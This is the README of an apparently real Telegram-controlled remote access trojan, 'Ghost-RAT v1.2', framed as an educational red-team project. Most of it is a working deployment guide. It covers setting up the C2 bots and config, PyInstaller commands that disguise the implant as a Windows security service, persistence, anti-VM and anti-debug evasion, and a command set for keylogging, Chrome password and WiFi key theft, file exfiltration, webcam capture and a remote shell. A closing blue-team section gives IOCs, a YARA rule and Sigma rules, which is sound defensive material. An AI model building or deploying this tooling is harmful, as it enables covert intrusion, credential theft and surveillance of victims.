# 👻 Ghost-RAT v1.2

### Advanced Telegram C2 Remote Access Tool — Educational Red Team Project

---

> ⚠️ **LEGAL DISCLAIMER & ETHICAL WARNING**
>
> Ghost-RAT is **STRICTLY** for:
> - **SOC (Security Operations Center) testing** and analysis
> - **Red team lab exercises** in isolated environments
> - **Malware behavior research** and detection technique development
> - **Cybersecurity education** and training
>
> **You MUST only use this on systems you own or have explicit written permission to test.**
> Unauthorized access to computer systems is **illegal** under the CFAA, IT Act 2000, and equivalent laws worldwide.
>
> **The authors take no responsibility for misuse.**

---

## 📋 Table of Contents

- [What's New in v1.2](#whats-new-in-v12)
- [Architecture](#architecture)
- [Features](#features)
- [File Structure](#file-structure)
- [Setup Guide](#setup-guide)
- [Building the Implant](#building-the-implant)
- [Usage Guide](#usage-guide)
- [Command Reference](#command-reference)
- [Detection & Analysis (Blue Team)](#detection--analysis-blue-team)
- [Troubleshooting](#troubleshooting)

---

## 🆕 What's New in v1.2

| Feature | Description |
|---------|-------------|
| **Anti-VM / Anti-Debug** | Detects VMware, VirtualBox, Hyper-V, debuggers, and sandboxes |
| **String Obfuscation** | XOR + base64 encoding defeats basic `strings` analysis |
| **Non-Blocking Keylogger** | Runs in background thread — no longer freezes the polling loop |
| **Exponential Backoff** | Smart retry on network failures (avoids burning bandwidth) |
| **Connection Pooling** | `requests.Session()` for keep-alive and performance |
| **Evasion Reporting** | Check-in messages include evasion mode and detection results |
| **Browser Decrypt Fix** | Proper AES-GCM error handling, DPAPI prefix validation |
| **Command History** | `/logs` command on C2 for audit trail |
| **Improved Build** | Better PyInstaller command with hidden imports and fake name |

---

## 🏗️ Architecture

Ghost-RAT uses **two separate Telegram bots** to avoid Telegram's `getUpdates` single-consumer limitation:

```
┌──────────────────────┐                              ┌──────────────────────┐
│   VICTIM (Windows)   │                              │   ATTACKER (Linux)   │
│                      │    ┌──────────────────────┐  │                      │
│  Ghost-RAT.exe       │    │   Private Telegram   │  │  c2_server.py        │
│  Uses: BOT_TOKEN     │───►│       Group          │◄─│  Uses: C2_BOT_TOKEN  │
│  (Implant Bot)       │    │                      │  │  (Observer Bot)      │
│  - Polls getUpdates  │    │  Both bots are       │  │  - Polls getUpdates  │
│  - Sends results     │    │  members of this     │  │  - Reads check-ins   │
│  - Executes commands │    │  group               │  │  - Logs activity     │
│  - Anti-VM checks    │    └──────────────────────┘  │  - SQLite tracking   │
│  - String obfuscation│                              │  - Command history   │
└──────────────────────┘                              └──────────────────────┘
```

**Implant Startup Flow:**
1. Acquire mutex (prevent duplicates)
2. Run anti-VM / anti-debug checks (configurable behavior)
3. Generate unique victim ID (hardware fingerprint)
4. Install persistence (3 methods)
5. Check-in to Telegram group (with retry + backoff)
6. Poll for commands with jitter

---

## ✨ Features

### Core
| Feature | Description |
|---------|-------------|
| Unique Victim ID | SHA-256 of hostname + MAC + username + disk serial → `GHOST-XXXXXXXX` |
| Persistence | Registry Run + Scheduled Task + Startup Folder (3 methods) |
| Jitter | 30-60s randomized intervals |
| Multi-victim | Target specific victims or broadcast `@all` |
| Mutex | Prevents duplicate instances |
| Retry + Backoff | Exponential backoff on consecutive network failures |
| Heartbeat | Periodic re-check-in to keep `last_seen` fresh |

### Security / Evasion
| Feature | Description |
|---------|-------------|
| Anti-VM | Registry keys, WMI model, MAC OUI, guest tool files |
| Anti-Debug | `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()` |
| Anti-Sandbox | Low resources, analysis tools, sandbox usernames, uptime |
| String Obfuscation | XOR + base64 for API URLs, registry paths, mutex names |
| Evasion Modes | `exit` (quit), `report` (log + continue), `disabled` (skip) |

### Implant Commands (22)
| Command | Description |
|---------|-------------|
| `/sysinfo` | OS, hostname, IP, user, arch |
| `/screenshot` | Capture screen |
| `/webcam` | Webcam snapshot |
| `/shell <cmd>` | Execute shell command |
| `/cd <path>` | Change directory |
| `/ls [path]` | List directory |
| `/upload <path>` | Exfiltrate file |
| `/download <url> <path>` | Download file to victim |
| `/clipboard` | Dump clipboard |
| `/wifi` | Saved WiFi passwords |
| `/keylog [secs]` | Capture keystrokes (non-blocking) |
| `/keylog_stop` | Stop active keylogger |
| `/search <pattern>` | Search files |
| `/browsers` | Chrome passwords (DPAPI + AES-GCM) |
| `/proclist` | List processes |
| `/prockill <pid>` | Kill process |
| `/antivm` | Check VM/debug/sandbox status |
| `/shutdown` | Shutdown machine |
| `/restart` | Restart machine |
| `/selfdestruct` | Remove & delete implant |
| `/help` | Show help |

### C2 Server Commands
| Command | Description |
|---------|-------------|
| `/victims` | List all registered victims |
| `/remove <id>` | Remove a victim |
| `/logs [N]` | Show recent command history |
| `/help` | Show help |

---

## 📁 File Structure

```
ghost-rat/
├── implant.py              # Windows implant payload (v1.2)
├── c2_server.py            # Linux C2 server (observer bot)
├── config.py               # Configuration (tokens, evasion mode, timing)
├── requirements.txt        # Python dependencies
├── README.md               # This file
├── utils/
│   ├── __init__.py
│   ├── victim_id.py        # Unique victim ID generation
│   ├── persistence.py      # Registry + schtask + startup folder
│   ├── evasion.py          # Anti-VM / anti-debug / anti-sandbox [NEW]
│   └── obfuscation.py      # XOR + base64 string obfuscation [NEW]
├── commands/
│   ├── __init__.py
│   └── handler.py          # Command dispatcher (22 commands)
└── dist/
    └── WindowsSecurityHealthService.exe   # Compiled implant
```

---

## 🛠️ Setup Guide

### Prerequisites
- **Python 3.9+**
- A **Telegram account**
- **Windows VM** (victim — isolated!)
- **Linux machine** (attacker — or WSL)

---

### Step 1: Create the Implant Bot (BOT_TOKEN)

1. Open Telegram and search for **@BotFather**
2. Send the command: `/newbot`
3. BotFather will ask for a **name** — type: `GhostImplantBot`
4. BotFather will ask for a **username** — type: `ghost_implant_1234_bot` (must end in `bot`)
5. BotFather will reply with a message like:

   ```
   Done! Congratulations on your new bot.
   ...
   Use this token to access the HTTP API:
   7012345678:AAF1xxxxxxxxxxxxxxxxxxxxxxxxxxx
   ```

6. **Copy that token** — you'll need it for `BOT_TOKEN`

---

### Step 2: Create the Observer Bot (C2_BOT_TOKEN)

1. In the **same @BotFather chat**, send `/newbot` again
2. Name: `GhostC2Bot`
3. Username: `ghost_c2_1234_bot`
4. BotFather will reply with **another token**, e.g.:

   ```
   Use this token to access the HTTP API:
   7198765432:BBG2yyyyyyyyyyyyyyyyyyyyyyyyyyyy
   ```

5. **Copy that token** — you'll need it for `C2_BOT_TOKEN`

> ⚠️ **Important**: You need TWO different bots. Do NOT use the same token for both.

---

### Step 3: Create a Private Group & Get GROUP_CHAT_ID

1. In Telegram, tap **New Group**
2. Name it anything (e.g. `Ghost Lab`)
3. **Add BOTH bots** to the group:
   - Search for `ghost_implant_1234_bot` → add it
   - Search for `ghost_c2_1234_bot` → add it
4. **Send any message** in the group (e.g. type `hello`)
5. Now open your browser and visit this URL (replace with YOUR implant bot token):

   ```
   https://api.telegram.org/bot7012345678:AAF1xxxxxxxxxxxxxxxxxxxxxxxxxxx/getUpdates
   ```

6. In the JSON response, look for the `"chat"` object. You'll see something like:

   ```json
   "chat": {
       "id": -1002345678901,
       "title": "Ghost Lab",
       "type": "supergroup"
   }
   ```

7. **Copy the `id` value** (including the minus sign!) — that's your `GROUP_CHAT_ID`
   - Example: `-1002345678901`

> 💡 **Tip**: If the response is `{"ok":true,"result":[]}` (empty), send another message in the group and refresh the URL.

---

### Step 4: Paste Everything into config.py

Open the file **`config.py`** (located in the project root folder):

```
ghost-rat/
└── config.py   ← OPEN THIS FILE
```

Find these 3 lines and replace the placeholder values:

**Line 28** — Paste your **Implant Bot Token**:
```python
# BEFORE:
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"

# AFTER (example):
BOT_TOKEN = "7012345678:AAF1xxxxxxxxxxxxxxxxxxxxxxxxxxx"
```

**Line 39** — Paste your **C2 Observer Bot Token**:
```python
# BEFORE:
C2_BOT_TOKEN = "YOUR_C2_BOT_TOKEN_HERE"

# AFTER (example):
C2_BOT_TOKEN = "7198765432:BBG2yyyyyyyyyyyyyyyyyyyyyyyyyyyy"
```

**Line 46** — Paste your **Group Chat ID**:
```python
# BEFORE:
GROUP_CHAT_ID = "YOUR_GROUP_CHAT_ID_HERE"

# AFTER (example):
GROUP_CHAT_ID = "-1002345678901"
```

**Your completed config.py should look like this:**
```python
BOT_TOKEN = "7012345678:AAF1xxxxxxxxxxxxxxxxxxxxxxxxxxx"         # ← From Step 1
C2_BOT_TOKEN = "7198765432:BBG2yyyyyyyyyyyyyyyyyyyyyyyyyyyy"     # ← From Step 2
GROUP_CHAT_ID = "-1002345678901"                                  # ← From Step 3
EVASION_MODE = "report"                                           # Keep as-is for lab testing
```

> 🔴 **Do NOT share your bot tokens publicly.** Anyone with the token can control the bot.

---

### Step 5: Install Dependencies

#### On Linux (Kali / Debian / Ubuntu) — USE A VIRTUAL ENVIRONMENT

Modern Linux distros (Kali 2023+, Debian 12+, Ubuntu 23.04+) block `pip install` on the system Python to protect OS packages. You'll get this error if you try:

```
error: externally-managed-environment

× This environment is externally managed
```

**Fix: Use a Python virtual environment (venv):**

```bash
# Navigate to the project folder
cd ~/Desktop/ghost_rat

# Create a virtual environment called 'venv'
python3 -m venv venv

# Activate it (your prompt will change to show '(venv)')
source venv/bin/activate

# Now pip works normally inside the venv
pip install -r requirements.txt
```

> 💡 **Every time you open a new terminal**, you must re-activate the venv:
> ```bash
> cd ~/Desktop/ghost_rat
> source venv/bin/activate
> ```

> 💡 To **deactivate** the venv when you're done: just type `deactivate`

#### On Windows (Implant Build Machine)

```bash
pip install -r requirements.txt
```

If you get a permissions error on Windows, use:
```bash
pip install --user -r requirements.txt
```

---

## 🔨 Building the Implant

> ⚠️ **IMPORTANT**: The build commands are different for **Windows** and **Linux**.
> Using the wrong format will produce a broken file without the `.exe` extension!

---

### 🪟 Windows (CMD — Recommended)

Copy-paste this **entire single line** into CMD:

```cmd
pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
```

### 🪟 Windows (PowerShell)

In PowerShell, use **backtick** (`` ` ``) for line breaks — NOT backslash `\`:

```powershell
pyinstaller --onefile --noconsole `
  --name WindowsSecurityHealthService `
  --hidden-import=pynput.keyboard._win32 `
  --hidden-import=pynput.mouse._win32 `
  implant.py
```

### 🐧 Linux (Bash)

On Linux/Mac, use backslash `\` for line breaks:

```bash
pyinstaller --onefile --noconsole \
  --name WindowsSecurityHealthService \
  --hidden-import=pynput.keyboard._win32 \
  --hidden-import=pynput.mouse._win32 \
  implant.py
```

---

### With a custom icon (Windows CMD):
```cmd
pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --icon=myicon.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
```

### With UPX compression (Windows CMD):
```cmd
pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --upx-dir=C:\upx --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
```

---

**Output**: `dist\WindowsSecurityHealthService.exe`

> **Why `WindowsSecurityHealthService`?** The name mimics a legitimate Windows service. This is for educational purposes — to demonstrate how real malware blends in.

> 🔴 **If your output file has NO `.exe` extension**, you used the Linux `\` command on Windows. Delete it and re-run using the **Windows CMD** single-line command above.

---

## 🚀 Usage Guide

### 1. Start C2 Server
```bash
python3 c2_server.py
```

### 2. Deploy Implant
Copy `.exe` to Windows VM and run it.

### 3. Send Commands
```
GHOST-A1B2C3D4 /sysinfo
GHOST-A1B2C3D4 /screenshot
@all /proclist
```

### 4. View Victims & Logs
```
/victims
/logs 10
```

---

## 🔬 Detection & Analysis (Blue Team)

### Network Indicators (IOCs)
- **DNS**: Queries to `api.telegram.org`
- **HTTPS**: Periodic POST/GET to `https://api.telegram.org/bot*/...`
- **Beaconing**: Regular 30-60s intervals with slight jitter (look for periodicity)
- **Backoff Pattern**: Intervals increase exponentially on failures (behavioral signature)
- **User-Agent**: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`
- **Two Bot Tokens**: Traffic to two different bot endpoints from the same network

### Host Indicators (IOCs)
| Artifact | Location |
|----------|----------|
| Registry Key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth` |
| Scheduled Task | `WindowsSecurityHealth` in Task Scheduler |
| Startup Folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityHealth.exe` |
| Victim ID File | `%APPDATA%\.ghost_id` (hidden) |
| Mutex | `Global\GhostRAT_WindowsSecurityHealth` |
| Process | `WindowsSecurityHealthService.exe` (unsigned, network connections) |
| Temp Files | `%TEMP%\ss_*.png`, `%TEMP%\cam_*.png`, `%TEMP%\login_data_*.db` |

### Anti-Analysis Detection (for analysts)
Ghost-RAT v1.2 checks for analysis environments. Analysts should be aware:
- **VM Detection**: Checks registry for VMware/VirtualBox keys, WMI model strings, MAC OUI prefixes, guest tool files
- **Debugger Detection**: `IsDebuggerPresent()` and `CheckRemoteDebuggerPresent()` Windows API calls
- **Sandbox Detection**: CPU count < 2, RAM < 2GB, analysis tool processes (wireshark, procmon, x64dbg, etc.), sandbox usernames, system uptime < 10 minutes
- **Bypass**: Set `EVASION_MODE = "disabled"` in `config.py` for lab analysis, or use `ScyllaHide` to hide debuggers

### String Obfuscation Analysis
- Strings are XOR'd with key `0x5A` and base64-encoded
- To decode: `echo "ENCODED_STRING" | base64 -d | python3 -c "import sys; print(bytes(b^0x5A for b in sys.stdin.buffer.read()).decode())"` 
- Look for `base64.b64decode` and XOR patterns in decompiled code

### YARA Rule
```yara
rule Ghost_RAT_v12 {
    meta:
        description = "Detects Ghost-RAT v1.2 implant"
        author = "SOC Team"
        severity = "high"
        version = "1.2"
    strings:
        $checkin = "GHOST-RAT CHECK-IN" ascii wide
        $ghost_id = "ghost_id" ascii
        $implant_name = "WindowsSecurityHealth" ascii
        $telegram = "api.telegram.org" ascii
        $mutex_pattern = "GhostRAT_" ascii
        $evasion1 = "IsDebuggerPresent" ascii
        $evasion2 = "CheckRemoteDebuggerPresent" ascii
        $obf_xor = { 5A }
        $b64_decode = "b64decode" ascii
    condition:
        uint16(0) == 0x5A4D and    // MZ header (PE file)
        3 of ($checkin, $ghost_id, $implant_name, $telegram, $mutex_pattern) or
        (2 of ($evasion1, $evasion2) and $b64_decode)
}
```

### Sigma Rules

#### Registry Persistence
```yaml
title: Ghost-RAT Registry Persistence
status: experimental
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains: 'WindowsSecurityHealth'
        EventType: SetValue
    condition: selection
level: high
```

#### Scheduled Task Creation
```yaml
title: Ghost-RAT Scheduled Task
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'schtasks'
            - 'WindowsSecurityHealth'
            - 'ONLOGON'
    condition: selection
level: high
```

#### Mutex Detection
```yaml
title: Ghost-RAT Mutex
status: experimental
logsource:
    category: create_mutex
    product: windows
detection:
    selection:
        MutexName|contains: 'GhostRAT_'
    condition: selection
level: critical
```

#### Telegram Beaconing
```yaml
title: Ghost-RAT Telegram C2 Beaconing
status: experimental
logsource:
    category: proxy
detection:
    selection:
        dst|contains: 'api.telegram.org'
        http_method: 'POST'
    timeframe: 5m
    condition: selection | count() > 3
level: medium
```

---

## 🔧 Troubleshooting

### Linux / Kali Issues
| Error | Cause | Fix |
|-------|-------|-----|
| `error: externally-managed-environment` | PEP 668 — Kali/Debian blocks pip on system Python | Use a virtual environment: `python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt` |
| `python3 -m venv: command not found` | venv module not installed | `sudo apt install python3-venv` |
| `pip: command not found` (inside venv) | pip not available | `sudo apt install python3-pip` then recreate venv |
| `ModuleNotFoundError: No module named 'telegram'` | Forgot to activate venv | `source venv/bin/activate` before running `python3 c2_server.py` |
| C2 server crashes on start | Wrong Python version | Check `python3 --version` — need 3.9+ |

### Config Errors
| Error | Fix |
|-------|-----|
| `BOT_TOKEN not configured!` | Edit `config.py` line 28 with your implant bot token |
| `C2_BOT_TOKEN not configured!` | Edit `config.py` line 39 — create a 2nd bot via @BotFather |
| `GROUP_CHAT_ID not configured!` | Edit `config.py` line 46 — find chat ID via the Telegram API URL (see Step 3) |

### Implant Issues
| Issue | Fix |
|-------|-----|
| Implant exits immediately | Check `EVASION_MODE` — set to `"disabled"` in VMs |
| No check-in received | Verify both bots are in the group + internet access |
| Commands not executing | Ensure correct victim ID format + message from group |
| Keylogger not returning results | v1.2 keylogger is non-blocking — results arrive after duration |

### Build Issues
| Issue | Fix |
|-------|-----|
| PyInstaller fails | `pip install --upgrade pyinstaller` |
| pynput missing in .exe | Add `--hidden-import=pynput.keyboard._win32` |
| Large .exe size | Use UPX compression: `--upx-dir=/path/to/upx` |

---

## 📜 License

Educational purposes only. No warranty. Use responsibly and legally.

---

*Built for cybersecurity education and defensive research. Ghost-RAT v1.2*
